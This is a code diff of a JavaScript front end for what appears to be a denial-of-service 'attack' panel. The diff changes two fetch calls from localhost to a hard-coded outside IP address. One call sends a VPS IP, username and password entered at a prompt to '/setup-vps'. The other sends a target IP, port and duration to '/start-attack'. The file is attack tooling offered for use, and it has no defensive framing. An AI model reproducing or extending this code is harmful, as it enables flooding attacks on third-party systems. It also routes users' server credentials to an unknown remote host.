@@ -4,7 +4,7 @@ document.getElementById('setupVPS').addEventListener('click', function () {
     const password = prompt('Enter VPS Password:');
 
     if (ip && username && password) {
-        fetch('http://localhost:3000/setup-vps', {
+        fetch('http://45.77.193.174:3000/setup-vps', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ ip, username, password }),
@@ -39,7 +39,7 @@ document.getElementById('attackButton').addEventListener('click', function () {
         return;
     }
 
-    fetch('http://localhost:3000/start-attack', {
+    fetch('http://45.77.193.174:3000/start-attack', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ ip, port, duration }),
